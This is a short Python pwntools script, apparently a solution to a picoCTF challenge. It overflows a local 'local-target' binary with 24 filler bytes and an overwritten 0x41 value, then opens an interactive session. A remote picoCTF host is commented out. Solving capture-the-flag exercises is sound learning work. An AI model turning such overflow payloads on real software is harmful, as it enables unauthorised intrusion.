from pwn import *
from pwn import p64

# pros = remote("saturn.picoctf.net",51268)
pros = process("./local-target")

payload = b"A" * 24
payload += p64(0x41)

pros.sendline(payload)
pros.interactive()
